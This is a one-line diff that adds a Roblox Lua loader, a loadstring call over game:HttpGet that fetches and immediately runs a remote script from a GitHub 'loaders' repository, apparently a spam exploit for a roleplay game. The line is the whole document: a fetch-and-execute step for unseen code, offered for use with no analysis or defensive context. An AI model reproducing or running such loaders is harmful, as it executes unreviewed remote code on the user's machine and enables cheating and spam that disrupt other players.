@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/dubai-rp-spam3-xofi9nl8nucbgh.lua"))()
